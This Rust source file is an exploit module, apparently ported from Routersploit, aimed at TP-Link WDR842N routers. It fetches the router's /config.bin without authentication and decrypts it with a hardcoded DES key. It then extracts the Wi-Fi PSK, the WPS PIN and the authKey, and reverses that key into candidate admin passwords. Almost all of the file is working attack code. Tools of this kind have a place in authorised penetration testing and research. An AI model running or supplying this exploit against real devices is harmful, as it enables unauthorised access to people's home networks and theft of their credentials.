use anyhow::{Result, Context};
use colored::*;
use reqwest::Client;
use std::time::Duration;
use des::Des;
use des::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
use crate::utils::{prompt_required, normalize_target, prompt_default};

/// TP-Link WDR842ND/WDR842N Configuration Disclosure
/// 
/// Downloads /config.bin, decrypts using DES (Key: 478DA50BF9E3D2CF),
/// and extracts authKey, cPskSecret, cUsrPIN.
/// Also decrypts authKey to retrieve admin password.

pub async fn run(target: &str) -> Result<()> {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║  TP-Link WDR842N Configuration Disclosure                 ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());

    let raw_ip = if target.is_empty() {
        prompt_required("Target IP").await?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    let port_str = prompt_default("Port", "80").await?;
    let port: u16 = port_str.parse().context("Invalid port")?;

    let url = format!("http://{}:{}/config.bin", target_ip, port);
    println!("{} Downloading config from {}", "[*]".blue(), url);

    let client = Client::builder()
        .timeout(Duration::from_secs(10))
        .danger_accept_invalid_certs(true)
        .build()?;

    let res = client.get(&url).send().await?;

    if res.status().is_success() {
        let _headers = res.headers().clone();
        // Check for x-bin/octet-stream or similar characteristic if needed, 
        // but Routersploit just checks status 200 and 'x-bin/octet-stream' in Content-Type.
        // We'll proceed if 200.
        
        let content = res.bytes().await?;
        println!("{} Config downloaded ({} bytes). Decrypting...", "[*]".blue(), content.len());

        if let Ok((passwd, auth_key, psk, pin)) = decrypt_config_bin(&content) {
            println!("{} Found cPskSecret: {}", "[+]".green(), psk);
            println!("{} Found cUsrPIN: {}", "[+]".green(), pin);
            println!("{} Found authKey: {}", "[+]".green(), auth_key);
            println!("{} Decoded Password:\n{}", "[+]".green(), passwd);
        } else {
            println!("{} Failed to decrypt or parse config.", "[-]".red());
        }
    } else {
        println!("{} Failed to download config (Status: {})", "[-]".red(), res.status());
    }

    Ok(())
}

fn decrypt_config_bin(data: &[u8]) -> Result<(String, String, String, String)> {
    // Key: \x47\x8D\xA5\x0B\xF9\xE3\xD2\xCF
    let key = [0x47, 0x8D, 0xA5, 0x0B, 0xF9, 0xE3, 0xD2, 0xCF];
    let cipher = Des::new(GenericArray::from_slice(&key));

    // Decrypt (DES ECB)
    // Data length must be multiple of 8 for DES. 
    // The downloaded binary might need padding handling or just be multiple of 8.
    // We'll process chunks.
    
    let mut decrypted = Vec::new();
    for chunk in data.chunks(8) {
        if chunk.len() == 8 {
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher.decrypt_block(&mut block);
            decrypted.extend_from_slice(&block);
        }
    }

    // Convert to string (lossy) to find keys
    // Strip nulls
    let decrypted_str = String::from_utf8_lossy(&decrypted).trim_matches(char::from(0)).to_string();
    
    // Parse
    let (auth_key, psk, pin) = parse_config(&decrypted_str);
    
    if auth_key.is_empty() {
        return Err(anyhow::anyhow!("authKey not found"));
    }
    
    let passwd = decrypt_auth_key(&auth_key);
    Ok((passwd, auth_key, psk, pin))
}

fn parse_config(data: &str) -> (String, String, String) {
    let mut auth_key = String::new();
    let mut psk = String::new();
    let mut pin = String::new();

    for line in data.lines() {
        if line.contains("authKey") {
            if let Some(val) = line.split_whitespace().nth(1) {
                auth_key = val.to_string();
            }
        }
        if line.contains("cPskSecret") {
            if let Some(val) = line.split_whitespace().nth(1) {
                psk = val.to_string();
            }
        }
        if line.contains("cUsrPIN") {
            if let Some(val) = line.split_whitespace().nth(1) {
                pin = val.to_string();
            }
        }
    }
    (auth_key, psk, pin)
}

fn decrypt_auth_key(auth_key: &str) -> String {
    let str_de = "RDpbLfCPsJZ7fiv";
    let dic = "yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD\
               02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV5\
               7fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oB\
               wmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW";
    
    // Matrix 15x?
    let mut matrix: Vec<String> = vec![String::new(); 15];
    let mut passwd_len = 0;

    for (cr_index, str_comp_char) in auth_key.chars().enumerate().take(15) {
        let mut passwd_list = String::new();
        let code_cr = str_de.as_bytes()[cr_index] as usize;
        
        for index in 32..127 {
            let str_tmp = (index as u8) as char;
            let code_cl = index as usize;
            let dic_idx = (code_cl ^ code_cr) % 255;
            
            if dic_idx < dic.len() {
                let str_dic = dic.chars().nth(dic_idx).unwrap();
                 if str_comp_char == str_dic {
                    passwd_list.push(str_tmp);
                }
            }
        }
        matrix[cr_index] = passwd_list;
    }

    for i in 0..15 {
        if matrix[i].is_empty() {
            passwd_len = i;
            break;
        } else if i == 14 {
            passwd_len = 15;
        }
    }

    let mut passwd = String::new();
    for i in 0..passwd_len {
        passwd.push_str(&matrix[i]);
        passwd.push('\n');
    }
    
    passwd
}
